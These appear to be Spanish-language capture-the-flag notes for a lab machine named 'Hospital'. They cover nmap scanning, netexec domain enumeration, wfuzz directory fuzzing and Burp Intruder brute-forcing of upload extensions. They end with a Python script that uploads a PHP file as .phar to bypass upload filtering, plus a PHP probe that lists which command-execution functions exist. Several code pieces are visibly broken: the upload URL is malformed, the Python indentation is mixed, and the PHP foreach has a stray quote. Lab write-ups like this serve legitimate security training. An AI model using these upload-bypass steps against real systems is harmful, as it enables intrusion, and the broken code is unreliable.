
-----
- TAG: #DOMINIOS #NETEXEC
----
- Empezamos creando nuestra carpeta Hospital en nuestra terminal, creamos las tres carpetas que necesitaremos para guardar la información 
```
mkt
```

- Empezamos con el proceso de  reconocimiento con **nmap** 
```
ping -c 1 10.10.11.241
```

- Realizamos una auditoria a la red para ver que puertos potenciales estan abiertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.241 -oG allPorts
```

- Extraemos la información de los puertos abiertos con 
```
extractPorts allPorts
```
   - Recordemos que con `locate .nse` podemos observar todos los scripts escritos en lua de nmap los cuales contiene categorias.
   - Con `locate .nse | xargs grep "categories"` podemos filtrar por categorias

- Realizamos el escaneo a los puertos abiertos y guardamos el output en el archivo **targeted**
```
nmap -p(puertos) -sCV 10.10.11.241 -oN targeted
```
 - Ahora el formato lo podemos ver en archivo grepeable y con estilo java con `cat taget -l java`
 - Vemos información como el la versión de Ubuntu corriendo por el puerto `22` y podemos tirar de **Launchpad**, con esto obtenemos información que corre un sistema **Lunar** (Puede que este corriendo un sub-sistema dentro de una maquina **Linux**)

## Jugando con Netexec
- Si no tenemos instalado realizamos el siguiente procedimiento de  [Instalación de Netexec](https://www.netexec.wiki/getting-started/installation/installation-on-unix)
- Lo tenemos guardado en /opt/Netexec
- Ahora podemos averiguar un poco mas o encontrar dominios, Para ello deberíamos estar en el directorio **/.local/bin**
```
pushd /opt/Netexec
poetry run netexec smb 10.10.11.241
```

 - Encontrando el dominio lo ingresamos en el **/etc/host** con la dirección ip de la maquina para que lo pueda leer nuestro sistema.
```
10.10.11.241 hospital.htb
```

- Podríamos enumerar un poco de rutas de la url con **wfuzz**
```
wfuzz -c --hc=404,403 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://10.10.11.241:443/FUZZ
```
   - Si refleja información o directorios podrias ingresar por la url, jugar un poco con mayúsculas y minúsculas con la palabra clave encontrada.

- Empezamos auditar la otra pagina **http** por el puerto **8080**
`http://hospital.htb:8080`
- Nos creamos un usuario y contraseña y nos logueamos 
- Empezamos auditar ciertas partes como información que nos de la url (usando **whatweb**) por ejemplo, interceptar información con **burpsuite**

----
- Creamos un archivo **extensions** con 
```
echo '.php , .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module' | tr ',' '\n' | sed 's/\.//g' | sed 's/ //' >> extensions
```
	 1. luego lo subimos a burpsuite en intruder en la opción load
	 2. De igual manera en "Grep - Extract" colocar 'load' selecionar /failed.php y poner ok
	 3. Luego de eso empezamos con el ataque de fuerza bruta para ver posibles rutas

- En la parte de scripts nos creamos el siguiente archivo **.py**
```
nvim fileUpload.py
```
```
#!/usr/bin/env python3

import requests
import pdb
import signal
import sys 
import time

from termcolor import colored 
from pwn import *

def def_handler(sig, frame):
 print(colored(f"\n\n[!] Saliendo..\n", 'red'))
 sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:upload.php"
cookies = {'PHPSESSID' : '=gvsg96egu23t3hjdnlv1ssb6ve'}
burp = {'http': 'http://127.0.0.1:8080'}

def fileUpload():

    f = open("cmd.php", "r")
    fileContent = f.read()

    fileToUpload = {'image': (f"cmd.phar", fileContent.strip())}

    r = requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)


	log.info("Archivo subido exitosamente")

if __name__ == '__main__':

	fileUpload()
```


- Luego un archivo .php llamado **cmd.php**
```
<?php 
  $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec");

  foreach ("$dangerous_functions as $f){
    if (function_exists($f)){
	  echo "\n^[+]" . $f . " - EXISTE";
    }
  }
?>
```
